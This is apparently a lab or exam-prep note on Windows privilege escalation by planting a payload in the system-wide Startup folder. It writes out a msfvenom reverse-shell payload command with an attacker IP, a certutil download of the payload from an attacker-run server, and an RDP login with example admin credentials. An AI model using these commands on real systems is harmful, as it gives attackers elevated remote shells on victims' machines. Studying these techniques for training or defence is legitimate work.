# Startup folder

The **Startup Folder** in Windows is a special folder that contains programs or scripts that **automatically run when a user logs in**. and the main thing is file and folders execution privilege depend on which user logged in , mean if Admin login the file will auto execute by admin privilege 

### There are two types of startup folder

> User wide startup folder
> 

> System wide startup folder [We use this for privilege escalation]
> 

### For all users

> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
> 

### For Current user

> C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
> 

1. Check if there any Write Permission inside the **Startup** folder

for check this thing we can use different techniques:

1. Create file or folder manually inside same directory

### Create a payload using MSF-Venom

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attacker IP] LPORT=[Attacker Port] -f exe -o payload.exe
```

### Now transfer the payload on the target system using python server and download the payload using **certutil**

```
certutil -urlcache -f http://192.168.201.88:8000/payload.exe payload.exe
```

### We trying to simulate if an **Administrator** connect the what will happened out attack will successful or not

```bash
xfreerdp3 /u:admin /p:password123 /cert:ignore /v:10.49.147.97 /dynamic-resolution
```

we successfully logged in as an Admin, now time to check we got any reverse shell or not with elevated privilege 

### Finally we got a reverse shell

In the exam environment we don’t need to login from admin account there will be any kind of automation script or tool which autorun the authentication method in the background
